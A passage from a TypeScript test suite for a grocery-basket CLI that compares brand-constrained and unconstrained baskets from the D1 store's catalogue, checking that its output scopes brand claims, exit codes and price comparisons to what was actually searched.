        // Odd calls: "arroz" exists but has no LATTI  -> no-brand-match.
        // Even calls: "unicornio" — D1 returns nothing -> no-match.
        const products =
          searches % 2 === 1 ? [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })] : [];
        return new Response(JSON.stringify({ products, recordsFiltered: products.length }), {
          status: 200,
        });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    const c = await compareBaskets(
      new D1Client({ fetchImpl: impl }),
      ["arroz", "unicornio"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines.map((l) => l.status)).toEqual(["no-brand-match", "no-match"]);
    // One term's failure has nothing to do with the brand, so the headline
    // must not speak for the whole list.
    expect(c.brandsSeen).toBeUndefined();
    expect(renderComparison(c)).not.toContain("Nothing D1 returned for these terms is LATTI");
  });

  test("the hint reports every brand D1 RETURNED, not one per term", async () => {
    // `brandsIn` read `product.brand` — one brand per line — and then claimed to
    // name "the brands it did return". Live, D1 returns ten brands for `leche`
    // and the hint printed one: a bakery brand that won the unit-price ranking,
    // while NATURAL FEELING — the exact near-miss a shopper typing NATURAL
    // needs — was on the page and unmentioned.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "LECHE ALPIN", { price: 3_000, brand: "ALPIN" }),
          wire("2", "LECHE MUUU", { price: 3_500, brand: "MUUU" }),
          wire("3", "LECHE NATURAL FEELING", { price: 4_000, brand: "NATURAL FEELING" }),
        ],
        sku: sourceSku("1", "LECHE ALPIN"),
        sweep: [],
        sweepTotal: 140,
      }),
      ["leche"],
      100_000_000,
      { brand: "NATURAL" },
    );
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
    // All three, not just the one the basket picked.
    expect(c.brandsSeen).toEqual(["ALPIN", "MUUU", "NATURAL FEELING"]);
    // And the near-miss is the whole reason the hint exists.
    expect(renderComparison(c)).toContain("NATURAL FEELING");
  });

  test("a long brand list is truncated OUT LOUD, not silently", async () => {
    const many = Array.from({ length: 20 }, (_, i) =>
      wire(String(i + 1), `LECHE M${i}`, {
        price: 3_000 + i,
        brand: `MARCA${String(i).padStart(2, "0")}`,
      }),
    );
    const c = await compareBaskets(
      fakeClient({ search: many, sku: sourceSku("1", "LECHE M0"), sweep: [], sweepTotal: 140 }),
      ["leche"],
      100_000_000,
      { brand: "NOSUCH" },
    );
    expect(c.brandsSeen).toHaveLength(20);
    const out = renderComparison(c);
    // A silent slice would drop exactly the near-miss the hint exists for.
    expect(out).toContain("and 8 more");
  });
});

describe("the returned-brand evidence spans BOTH runs [BRO-2079 round 5]", () => {
  test("a brand only the branded run's page carried still counts as returned", async () => {
    // `compareBaskets` searches twice, and D1 can answer differently between
    // them — that is the whole reason `altNoMatch` exists. Building the
    // returned-brand set from the base run alone therefore misses a brand that
    // only the second page carried, and the headline reverts to claiming D1
    // returned none of it.
    //
    // Base's page: OTRA only. Alt's page: OTRA plus an out-of-stock LATTI.
    let searches = 0;
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("1", "ARROZ OTRA")), { status: 200 });
      }
      if (u.pathname.includes("intelligent-search/product_search")) {
        const isSweep =
          u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
          "";
        if (isSweep) {
          return new Response(JSON.stringify({ products: [], recordsFiltered: 0 }), {
            status: 200,
          });
        }
        searches++;
        const products =
          searches === 1
            ? [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })]
            : [
                wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" }),
                wire("2", "ARROZ LATTI", { price: 4_000, brand: "LATTI", available: false }),
              ];
        return new Response(JSON.stringify({ products, recordsFiltered: products.length }), {
          status: 200,
        });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    const c = await compareBaskets(new D1Client({ fetchImpl: impl }), ["arroz"], 100_000_000, {
      brand: "LATTI",
    });
    // Only the SECOND page carried LATTI.
    expect(c.base.lines[0]?.pageBrands).toEqual(["OTRA"]);
    expect(c.alt.lines[0]?.pageBrands).toEqual(["LATTI", "OTRA"]);
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
    // ...and that is still evidence D1 returned it, on the PAGE — so the
    // evidence list below the headline corroborates it.
    expect(c.brandReturnedIn).toBe("page");
    expect(renderComparison(c)).toContain("for these terms, but nothing of it can be bought");
  });
});

describe("a brand claim never outruns its look [BRO-2079 round 6]", () => {
  /** One page of `looked` products out of `matched` D1 has, none of them LATTI. */
  const narrow = (looked: number, matched: number) =>
    fakeClient({
      search: Array.from({ length: looked }, (_, i) =>
        wire(String(i + 1), `LECHE OTRA ${i}`, { price: 3_000 + i, brand: "OTRA" }),
      ),
      searchTotal: matched,
      sku: sourceSku("1", "LECHE OTRA 0"),
      sweep: [],
      sweepTotal: 140,
    });

  /** The same, with BOTH looks complete — the negative polarity for every scope test. */
  const complete = (n: number) =>
    fakeClient({
      search: Array.from({ length: n }, (_, i) =>
        wire(String(i + 1), `LECHE OTRA ${i}`, { price: 3_000 + i, brand: "OTRA" }),
      ),
      searchTotal: n,
      sku: sourceSku("1", "LECHE OTRA 0"),
      sweep: [],
    });

  test("a partial look says so, with both numbers", async () => {
    // `--count` defaults to 12 against result sets of 25-31, so the unqualified
    // negative was false for twelve of twelve real brands tried at default
    // flags: "Nothing D1 returned for these terms is ALPIN" while ALPIN sat in
    // stock at product 13.
    const c = await compareBaskets(narrow(12, 29), ["leche"], 100_000_000, { brand: "LATTI" });
    expect(c.partial).toEqual({ terms: 1, looked: 12, matched: 29 });
    const out = renderComparison(c);
    expect(out).toContain("Nothing the look reached for these terms is LATTI");
    expect(out).toContain("12 of the 29 D1 matched across 1 term");
    expect(out).toContain("Raise --count to widen the page look");
    // The unqualified form must NOT appear.
    expect(out).not.toContain("Nothing D1 returned for these terms is LATTI");
  });

  test("the per-term sentence carries the same scope as the headline", async () => {
    // It makes the same claim and was equally unqualified.
    const out = renderComparison(
      await compareBaskets(narrow(12, 29), ["leche"], 100_000_000, { brand: "LATTI" }),
    );
    expect(out).toContain("no LATTI in what was searched (12 of 29 on its page");
    expect(out).not.toContain("Not counted — no LATTI for");
    // ...and it reads THIS TERM's numbers, never the comparison's aggregate.
    // Round 9 found the aggregate printed here; see the round-10 block below.
    expect(out).not.toContain("across 1 term), for");
  });

  test("a complete look drops the qualifier rather than hedging forever", async () => {
    // The other polarity: when the page held everything D1 matched, the plain
    // sentence is the true one and the hedge would be noise.
    //
    // BOTH looks, since round 10. `narrow` sweeps 0 of 140, which is a partial
    // CATEGORY look and correctly earns a qualifier of its own — so a fixture
    // that means "complete" has to be complete in both populations, and this
    // one says so out loud rather than leaving the second axis to a default.
    const c = await compareBaskets(complete(12), ["leche"], 100_000_000, { brand: "LATTI" });
    expect(c.partial).toBeUndefined();
    expect(c.sweepPartial).toBeUndefined();
    const out = renderComparison(c);
    expect(out).toContain("Nothing D1 returned for these terms is LATTI");
    expect(out).not.toContain("Raise --count");
    expect(out).not.toContain("products looked at");
  });

  test("the comparison states that both prices are the best of a WINDOW", async () => {
    // `renderBasket` has always said this; `renderComparison` said nothing, and
    // the same command at --count 12 and --count 30 reports different totals.
    const out = renderComparison(
      await compareBaskets(narrow(12, 29), ["leche"], 100_000_000, { brand: "LATTI" }),
    );
    // No per-term number in it. Round 7 made `partial.looked` a SUM and left
    // this sentence reading it as one term's own: with two terms it said "best
    // among the 22 products fetched for its term" where no term fetched 22.
    // `footerFor` — the sentence `renderBasket` has always printed — makes no
    // numeric claim at all, which is the only form that is true of every row.
    expect(out).toContain("best among the products fetched for its term, not across all of D1");
    expect(out).not.toMatch(/best among the \d+ products fetched/);
  });

  test("the denominator is SUMMED across terms, not one term's own pair", async () => {
    // It used to minimise on `looked`, which at the default count is 12 for
    // every partial line — so ties resolved to whichever term was typed first,
    // and `--brand ALPIN sal leche` said "D1 matched 4" while 28 unseen `leche`
    // products went unmentioned. Reversing the two arguments changed the number
    // to 29. A denominator that depends on argument order is not one.
    let searches = 0;
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("1", "P0")), { status: 200 });
      }
      if (u.pathname.includes("intelligent-search/product_search")) {
        const isSweep =
          u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
          "";
        if (isSweep) {
          return new Response(JSON.stringify({ products: [], recordsFiltered: 0 }), {
            status: 200,
          });
        }
        searches++;
        // Term 1 gets a WIDE page (20 of 40); term 2 a NARROW one (5 of 40).
        const n = searches % 2 === 1 ? 20 : 5;
        const products = Array.from({ length: n }, (_, i) =>
          wire(String(i + 1), `P${i}`, { price: 3_000 + i, brand: "OTRA" }),
        );
        return new Response(JSON.stringify({ products, recordsFiltered: 40 }), { status: 200 });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    const c = await compareBaskets(
      new D1Client({ fetchImpl: impl }),
      ["wide", "tight"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines.map((l) => l.looked)).toEqual([20, 5]);
    // 20 + 5 looked, of 40 + 40 matched — every term counted once.
    expect(c.partial).toEqual({ terms: 2, looked: 25, matched: 80 });
    const out = renderComparison(c);
    // The sum is LABELLED as one. Round 9: two sentences read it as a per-term
    // number, and 25 is a number neither term has.
    expect(out).toContain("25 of the 80 D1 matched across 2 terms");
    // ...and the per-term sentences print each term's own pair, so the two
    // terms cannot share one line here.
    expect(out).toContain("(20 of 40 on its page");
    expect(out).toContain("(5 of 40 on its page");
    expect(out).not.toMatch(/\(25 of 80 on its page/);

    // ...and reversing the arguments cannot change it.
    const reversed = await compareBaskets(
      new D1Client({ fetchImpl: impl }),
      ["tight", "wide"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(reversed.partial).toEqual(c.partial);
  });

  test("a brand only the SWEEP returned still counts as returned", async () => {
    // `brandLine` filtered candidates by brand and threw the rest away, so a
    // brand the CATEGORY carried — in stock at Price 0, the exact VTEX shape —
    // reproduced the round-5 blocker one hop over: the code looked at a LATTI
    // product, rejected it as unbuyable, then said D1 returned none of it.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })],
        // A PARTIAL look, or `c.partial` is undefined and the last assertion
        // below cannot fail — no render path can produce that string when the
        // page held everything D1 matched.
        searchTotal: 29,
        sku: sourceSku("1", "ARROZ OTRA"),
        sweep: [wire("9", "ARROZ LATTI SIN OFERTA", { price: 0, brand: "LATTI" })],
        sweepTotal: 140,
      }),
      ["arroz"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
    expect(c.alt.lines[0]?.sweepBrands).toContain("LATTI");
    expect(c.partial).toEqual({ terms: 1, looked: 1, matched: 29 });
    // The SWEEP, not the page — and that distinction is the whole of round 8.
    expect(c.brandReturnedIn).toBe("sweep");
    const out = renderComparison(c);
    // "Found but unbuyable" still outranks "not among the N looked at": it is
    // the stronger and more specific fact, and both cannot head the same output.
    expect(out).toContain("but nothing of it the look reached can be bought");
    expect(out).not.toContain("Nothing the look reached for these terms is");
    // ...but it carries its own denominator. Round 8: this assertion used to
    // read `not.toContain("Nothing among the")` and nothing else, which pinned
    // an UNQUALIFIED universal — "nothing of it can be bought at this store"
    // asserted over a look of one product of twenty-nine. Round 6 removed
    // exactly that sentence shape from the other headline arm and never touched
    // this one, so the suite was holding the defect in place.
    expect(out).toContain("the look covered 1 of the 29 D1 matched across 1 term");
    // ...and it names the population it found the brand in, so it cannot
    // compete with the page-scoped evidence list underneath it.
    expect(out).toContain("in the category around these terms");
  });
});

describe("one label, one population [BRO-2079 round 7]", () => {
  test("the brand list is the PAGE, never the page plus a category sweep", async () => {
    // A round-6 change unioned the sweep into this list and turned a TRUE
    // sentence false: `--brand ZZNOSUCH arroz sal` named nineteen brands where
    // D1 had returned six, the other thirteen swept from one product's
    // category, under a label reading "for these terms" — and with a complete
    // look, so no qualifier even applied.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ ALBAR", { price: 3_000, brand: "ALBAR" })],
        sku: sourceSku("1", "ARROZ ALBAR"),
        sweep: [
          wire("9", "AZÚCAR RIOPAILA", { price: 4_000, brand: "RIOPAILA" }),
          wire("10", "ENDULZANTE SPLENDA", { price: 5_000, brand: "SPLENDA" }),
        ],
        sweepTotal: 140,
      }),
      ["arroz"],
      100_000_000,
      { brand: "ZZNOSUCH" },
    );
    // The sweep IS still evidence for the other question.
    expect(c.alt.lines[0]?.sweepBrands).toEqual(["RIOPAILA", "SPLENDA"]);
    // ...but not for this sentence.
    expect(c.brandsSeen).toEqual(["ALBAR"]);
    const out = renderComparison(c);
    expect(out).toContain("Brands on these terms' own pages: ALBAR.");
    expect(out).not.toContain("RIOPAILA");
    expect(out).not.toContain("SPLENDA");
  });

  test("with a partial look the list says which look it is", async () => {
    // It was the same unqualified universal as the headline, one line below the
    // sentence that had just been fixed: for `leche` it named one brand of the
    // eleven D1 returns.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "LECHE LATTI", { price: 3_000, brand: "LATTI" })],
        searchTotal: 29,
        sku: sourceSku("1", "LECHE LATTI"),
        sweep: [],
        sweepTotal: 140,
      }),
      ["leche"],
      100_000_000,
      { brand: "ALPIN" },
    );
    const out = renderComparison(c);
    expect(out).toContain("Brands among the 1 products looked at across 1 term: LATTI.");
    expect(out).not.toContain("Brands on these terms' own pages");
  });

  test("the per-term cause reads the same evidence as the headline", async () => {
    // It printed "no NATURAL FEELING for: leche" six lines under "D1 returned
    // NATURAL FEELING ... but nothing of it can be bought" — the round-5
    // contradiction, in the bucket whose design rule is naming the cause.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "LECHE OTRA", { price: 3_000, brand: "OTRA" }),
          wire("2", "LECHE NF", { price: 0, brand: "NF" }),
        ],
        sku: sourceSku("1", "LECHE OTRA"),
        sweep: [],
      }),
      ["leche"],
      100_000_000,
      { brand: "NF" },
    );
    expect(c.brandReturnedIn).toBe("page");
    const out = renderComparison(c);
    expect(out).toContain("NF is on its own page and nothing of it is buyable here, for: leche");
    expect(out).not.toContain("no NF for: leche");
  });

  test("a partial look does not exit 3, which means 'never retry'", async () => {
    // The same run prints "Raise --count to widen the look", and widening it
    // does fill the basket. An agent branching on 3 records a fact the prose
    // beside it denies — round 6's own argument, in the command it was about.
    const partial = await compareBaskets(
      fakeClient({
        search: [wire("1", "LECHE OTRA", { price: 3_000, brand: "OTRA" })],
        searchTotal: 29,
        sku: sourceSku("1", "LECHE OTRA"),
        sweep: [],
        sweepTotal: 140,
      }),
      ["leche"],
      100_000_000,
      { brand: "ALPIN" },
    );
    expect(partial.partial).toBeDefined();
    expect(comparisonExit(partial)).toBe(0);

    // A COMPLETE look that found nothing is still a genuine none — and
    // "complete" means BOTH populations, since round 10. With `sweepTotal: 140`
    // this fixture swept 0 of 140, which is exactly round 9's blocker: a
    // categorical claim over a partial category, exiting 3.
    const complete = await compareBaskets(
      fakeClient({
        search: [wire("1", "LECHE OTRA", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "LECHE OTRA"),
        sweep: [],
      }),
      ["leche"],
      100_000_000,
      { brand: "ALPIN" },
    );
    expect(complete.partial).toBeUndefined();
    expect(complete.sweepPartial).toBeUndefined();
    expect(comparisonExit(complete)).toBe(3);
  });
});

describe("both looks, not one [BRO-2079 round 10]", () => {
  /**
   * A page that holds everything D1 matched, over a category that does NOT.
   *
   * Round 9's blocker in fixture form. Every claim in the render was scoped to
   * the page by round 6, and the page here is complete — so before round 10 no
   * qualifier printed anywhere, while the verdict actually rested on a sweep
   * that had seen 10 of 41.
   */
  const wideCategory = () =>
    fakeClient({
      search: [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })],
      sku: sourceSku("1", "ARROZ OTRA"),
      sweep: Array.from({ length: 10 }, (_, i) =>
        wire(`s${i}`, `OTRO ${i}`, { price: 4_000 + i, brand: "OTRA" }),
      ),
      sweepTotal: 41,
    });

  test("a categorical claim over a PARTIAL CATEGORY says so", async () => {
    const c = await compareBaskets(wideCategory(), ["arroz"], 100_000_000, { brand: "QUAKER" });
    expect(c.alt.lines[0]?.status).toBe("no-brand-match");
    // The page look was complete. This is the whole point: the axis that made
    // the claim false is the one nothing was reading.
    expect(c.partial).toBeUndefined();
    expect(c.sweepPartial).toEqual({ terms: 1, swept: 10, categoryTotal: 41 });
    const out = renderComparison(c);
    expect(out).toContain("10 of the 41 in the category around them");
    expect(out).not.toContain("Nothing D1 returned for these terms is QUAKER.");
    // ...and it does not tell the reader to raise a flag that no longer
    // reaches the sweep.
    expect(out).toContain("The category sweep reads one page and --count does not widen it.");
  });

  test("...and does not exit 3, which means 'never worth retrying'", async () => {
    const c = await compareBaskets(wideCategory(), ["arroz"], 100_000_000, { brand: "QUAKER" });
    expect(comparisonExit(c)).toBe(0);
  });

  test("a COMPLETE category still exits 3 — the guard is not a constant", async () => {
    // The other polarity. Without this, `comparisonExit` could return 0 always
    // and both assertions above would still hold.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "ARROZ OTRA"),
        sweep: Array.from({ length: 41 }, (_, i) =>
          wire(`s${i}`, `OTRO ${i}`, { price: 4_000 + i, brand: "OTRA" }),
        ),
        sweepTotal: 41,
      }),
      ["arroz"],
      100_000_000,
      { brand: "QUAKER" },
    );
    expect(c.sweepPartial).toBeUndefined();
    expect(comparisonExit(c)).toBe(3);
  });

  test("`--count` does not narrow the category sweep", async () => {
    // The knob that was silently two knobs. `--count` defaults to 12 on the
    // search page and 50 on the sweep, and forwarding it meant typing the
    // page's own documented default cut the sweep to a quarter — inverting the
    // answer and the exit code. Live: `--brand QUAKER arroz` filled at $ 4.950
    // and `--brand QUAKER arroz --count 12` denied the brand and exited 3.
    const counts: number[] = [];
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("1", "ARROZ OTRA")), { status: 200 });
      }
      if (u.pathname.includes("intelligent-search/product_search")) {
        const isSweep =
          u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
          "";
        if (isSweep) counts.push(Number(u.searchParams.get("count")));
        const products = isSweep ? [] : [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })];
        return new Response(JSON.stringify({ products, recordsFiltered: products.length }), {
          status: 200,
        });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    await compareBaskets(new D1Client({ fetchImpl: impl }), ["arroz"], 100_000_000, {
      brand: "QUAKER",
      count: 12,
    });
    expect(counts.length).toBeGreaterThan(0);
    // 50, the sweep's own default and its ceiling — not the 12 that was asked
    // for the term page.
    expect(new Set(counts)).toEqual(new Set([50]));
  });

  test("a repeated term does not count one catalogue twice", async () => {
    // `--brand ALPIN leche leche` reported "D1 matched 58" about a term D1
    // matches 29 of, and a look of 24 over a page holding 12. The rows stay
    // separate — they are separate outcomes — but a denominator is a fact about
    // the shelf, and the shelf was asked once.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "LECHE OTRA", { price: 3_000, brand: "OTRA" })],
        searchTotal: 29,
        sku: sourceSku("1", "LECHE OTRA"),
        sweep: [],
      }),
      ["leche", "leche"],
      100_000_000,
      { brand: "ALPIN" },
    );
    expect(c.rows).toHaveLength(2);
    expect(c.partial).toEqual({ terms: 1, looked: 1, matched: 29 });
    expect(renderComparison(c)).not.toContain("58");
  });

  test("per-term verdicts do not share one global sentence", async () => {
    // Live: `--brand COPELIA --count 50 leche arroz` printed "COPELIA found but
    // not buyable here, for: leche, arroz" — true of `leche`, whose page holds
    // an unbuyable COPELIA, and false of `arroz`, which has none of it in
    // either population at a complete look. Sixth recurrence of one defect.
    let searches = 0;
    const impl = (async (url: string) => {
      const u = new URL(String(url));
      if (u.pathname.includes("catalog_system")) {
        return new Response(JSON.stringify(sourceSku("1", "P")), { status: 200 });
      }
      if (u.pathname.includes("intelligent-search/product_search")) {
        const isSweep =
          u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
          "";
        if (isSweep) {
          return new Response(JSON.stringify({ products: [], recordsFiltered: 0 }), {
            status: 200,
          });
        }
        searches++;
        // `leche` (first) carries an unbuyable COPELIA; `arroz` carries none.
        const products =
          searches % 2 === 1
            ? [
                wire("1", "LECHE OTRA", { price: 3_000, brand: "OTRA" }),
                wire("2", "LECHE COPELIA", { price: 0, brand: "COPELIA" }),
              ]
            : // Same SKU id as the `catalog_system` stub returns, or
              // `findSubstitutes` cannot resolve the source and the line becomes
              // `replacement-unknown` — a fact about the stub, not about D1.
              [wire("1", "ARROZ OTRA", { price: 3_000, brand: "OTRA" })];
        return new Response(JSON.stringify({ products, recordsFiltered: products.length }), {
          status: 200,
        });
      }
      return new Response("[]", { status: 200 });
    }) as unknown as typeof fetch;

    const c = await compareBaskets(
      new D1Client({ fetchImpl: impl }),
      ["leche", "arroz"],
      100_000_000,
      { brand: "COPELIA" },
    );
    expect(c.onlyBase.map((m) => [m.term, m.returnedIn])).toEqual([
      ["leche", "page"],
      ["arroz", undefined],
    ]);
    const out = renderComparison(c);
    // TWO sentences, each naming only the terms it is true of.
    expect(out).toContain(
      "Not counted — COPELIA is on its own page and nothing of it is buyable here, for: leche.",
    );
    expect(out).toContain("Not counted — D1 returned no COPELIA at all for: arroz.");
    expect(out).not.toContain("for: leche, arroz");
  });

  test("terms with identical evidence still share one sentence", async () => {
    // The grouping must not degenerate into one line per term — that was the
    // benefit of the global sentence and it is kept.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "X OTRA", { price: 3_000, brand: "OTRA" })],
        sku: sourceSku("1", "X OTRA"),
        sweep: [],
      }),
      ["arroz", "sal"],
      100_000_000,
      { brand: "QUAKER" },
    );
    expect(c.onlyBase).toHaveLength(2);
    const out = renderComparison(c);
    expect(out).toContain("Not counted — D1 returned no QUAKER at all for: arroz, sal.");
  });

  test("a substituted price is disclosed as a replacement, by name", async () => {
    // `brandLine` runs only when the term's own page held nothing of the brand,
    // so its fill is ALWAYS a product swept from some category. Live:
    // `--brand DULCRALIGHT … arroz` filled `arroz` with `ENDULZANTE FRASCO
    // 180 GRS` and reported the brand cheaper on rice. `renderComparison`
    // named neither the product nor the substitution.
    const c = await compareBaskets(
      fakeClient({
        search: [wire("1", "ARROZ DIANA 500 G", { price: 3_000, brand: "DIANA" })],
        sku: sourceSku("1", "ARROZ DIANA 500 G"),
        sweep: [wire("9", "ENDULZANTE FRASCO 180 GRS", { price: 2_000, brand: "DULCRALIGHT" })],
      }),
      ["arroz"],
      100_000_000,
      { brand: "DULCRALIGHT" },
    );
    expect(c.alt.lines[0]?.status).toBe("filled-by-substitute");
    const out = renderComparison(c);
    expect(out).toContain("ENDULZANTE FRASCO 180 GRS");
    expect(out).toContain("replacing ARROZ DIANA 500 G from its category");
    // ...and the footer stops claiming every line came from the term's own page.
    expect(out).toContain("the closest match from its category");
  });

  test("a delta computed across two measures says so, and names both products", async () => {
    // Live: `--brand LATTI leche --count 50` reported LATTI $ 1.310 cheaper.
    // The unconstrained side bought bread rolls ranked on $/kg; the branded
    // side milk ranked on $/L. `chooseBest` filters by brand BEFORE the measure
    // census, so the constraint moves the axis — and the table prints numbers
    // only, so nothing on screen let a reader see it.
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "PAN LECHE HORNEADITOS 440 G", {
            price: 4_400,
            brand: "OTRA",
            unit: "Gr",
            value: "440",
          }),
          wire("2", "LECHE ENTERA LATTI 900 ML", {
            price: 3_090,
            brand: "LATTI",
            unit: "ml",
            value: "900",
          }),
        ],
      }),
      ["leche"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(c.base.lines[0]?.rankedOn).toBe("kg");
    expect(c.alt.lines[0]?.rankedOn).toBe("L");
    const out = renderComparison(c);
    expect(out).toContain("ranked on DIFFERENT measures (leche: per kg vs per L)");
    expect(out).toContain("PAN LECHE HORNEADITOS 440 G");
    expect(out).toContain("LECHE ENTERA LATTI 900 ML");
  });

  test("...and a like-for-like delta carries no such warning", async () => {
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "LECHE OTRA 900 ML", { price: 4_400, brand: "OTRA", unit: "ml", value: "900" }),
          wire("2", "LECHE LATTI 900 ML", {
            price: 3_090,
            brand: "LATTI",
            unit: "ml",
            value: "900",
          }),
        ],
      }),
      ["leche"],
      100_000_000,
      { brand: "LATTI" },
    );
    expect(renderComparison(c)).not.toContain("ranked on DIFFERENT measures");
  });

  test("an accent is not a different brand", async () => {
    // Live: `--brand "TRADICION 1915"` denied a brand that `--brand
    // "TRADICIÓN 1915"` bought at $ 4.200. One keystroke, opposite answers
    // about the same shelf, in a Colombian catalogue typed at by Spanish
    // speakers.
    expect(normalizeBrand("TRADICION 1915")).toBe(normalizeBrand("TRADICIÓN 1915"));
    const c = await compareBaskets(
      fakeClient({
        search: [
          wire("1", "AREPA TRADICION", { price: 4_200, brand: "TRADICIÓN 1915" }),
          wire("2", "AREPA OTRA", { price: 9_000, brand: "OTRA" }),
        ],
      }),
      ["arepa"],
      100_000_000,
      { brand: "TRADICION 1915" },
    );
    expect(c.alt.lines[0]?.status).toBe("filled");
  });

  test("...but two genuinely different brands stay different", async () => {
    // The folding must not become a substring or fuzzy match. Otherwise the
    // filter would buy the wrong product, which is the failure this arc is
    // built to refuse.
    expect(normalizeBrand("LATTI")).not.toBe(normalizeBrand("LATTI FOODS"));
    expect(normalizeBrand("D-1")).toBe("D-1");
  });

  test("the brands hint never cuts the brand it was asked about", async () => {
    // Sorted alphabetically and cut at twelve, so a near-miss spelling of the
    // requested brand could fall past the cut — and the omission emits exactly
    // the pair FORBIDDEN rule 1 forbids: "Nothing D1 returned … is X" over a
    // list that does not name X.
    const many = [
      // A numeric SKU: `findSubstitutes` refuses a non-numeric one, and a
      // source it cannot resolve makes the line `replacement-unknown` — which
      // would suppress the hint entirely and quietly gut this test.
      wire("99", "P 99", { price: 0, brand: "WANTED" }),
      ...Array.from({ length: 20 }, (_, i) =>
        wire(String(i), `P ${i}`, { price: 0, brand: `B${String(i).padStart(2, "0")}` }),
      ),
    ];
    const c = await compareBaskets(
      fakeClient({ search: many, sku: sourceSku("99", "P 99"), sweep: [] }),
      ["x"],
      100_000_000,
      { brand: "WANTED" },
    );
    expect(c.brandsSeen).toContain("WANTED");
    const listLine = renderComparison(c)
      .split("\n")
      .find((l) => l.startsWith("Brands "));
    expect(listLine).toContain("WANTED");
    expect(listLine).toContain("and 9 more");
  });

  test("the widening advice is not printed at --count's own ceiling", async () => {
    // `search` clamps to 50, so `--count 50` and `--count 100` are
    // byte-identical and two sentences told the reader to do what the CLI
    // refuses.
    const client = () =>
      fakeClient({
        search: Array.from({ length: 50 }, (_, i) =>
          wire(String(i), `P ${i}`, { price: 3_000 + i, brand: "OTRA" }),
        ),
        searchTotal: 300,
        sku: sourceSku("0", "P 0"),
        sweep: [],
      });
    const atCeiling = renderComparison(
      await compareBaskets(client(), ["x"], 100_000_000, { brand: "LATTI", count: 50 }),
    );
    expect(atCeiling).toContain("--count is already at its ceiling of 50");
    expect(atCeiling).not.toContain("Raise --count");

    // The other polarity, or the sentence could be deleted entirely.
    const belowCeiling = renderComparison(
      await compareBaskets(client(), ["x"], 100_000_000, { brand: "LATTI", count: 20 }),
    );
    expect(belowCeiling).toContain("Raise --count to widen the page look");
    expect(belowCeiling).not.toContain("already at its ceiling");
  });

  test("...and `d1 basket` without --brand honours the same ceiling", () => {
    // The unbranded render has printed "Raise --count to widen it." since long
    // before this feature, and it is wrong at 50 for exactly the same reason.
    // Found by mutation: reverting `renderBasket`'s ceiling check survived the
    // whole suite, because every assertion about that footer was written at the
    // default count.
    const plan = fillToBudget(
      [line({ term: "arroz", price: 3_000, compared: 2, matched: 40 })],
      100_000_000,
    );
    expect(renderBasket(plan, { count: 50 })).toContain("--count is already at its ceiling of 50");
    expect(renderBasket(plan, { count: 50 })).not.toContain("Raise --count");
    expect(renderBasket(plan, { count: 20 })).toContain("Raise --count to widen it.");
    // Unspecified means the default of 12, which is below the ceiling.
    expect(renderBasket(plan)).toContain("Raise --count to widen it.");
  });

  test("main() itself returns the comparison's exit code, not the plan's", async () => {
    // Round 9's merge condition. `comparisonExit` was extracted to be testable
    // and then only tested against a hand-built `CrossBasket` — nothing checked
    // that `case "basket"` calls it at all, so a mutation using `basketExit(plan)`
    // there would have been invisible.
    const real = globalThis.fetch;
    try {
      globalThis.fetch = (async (url: string) => {
        const u = new URL(String(url));
        if (u.pathname.includes("catalog_system")) {
          return new Response(JSON.stringify(sourceSku("1", "ARROZ OTRA")), { status: 200 });
        }
        if (u.pathname.includes("intelligent-search/product_search")) {
          const isSweep =
            u.pathname.replace(/\/api\/io\/_v\/api\/intelligent-search\/product_search\/?/, "") !==
            "";
          const products = isSweep ? [] : [wire("1", "ARROZ OTRA", { price: 3_000 })];
          return new Response(
            JSON.stringify({ products, recordsFiltered: isSweep ? 0 : products.length }),
            { status: 200 },
          );
        }
        return new Response("[]", { status: 200 });
      }) as unknown as typeof fetch;

      // The BASE basket fills; the branded one finds nothing anywhere and both
      // looks are complete. The plan's code would be 0 and the comparison's 3.
      expect(
        await main(["basket", "--budget", "100000", "--brand", "LATTI", "arroz", "--json"]),
      ).toBe(3);
      // ...and the unbranded form of the same list is a real answer.
      expect(await main(["basket", "--budget", "100000", "arroz", "--json"])).toBe(0);
    } finally {
      globalThis.fetch = real;
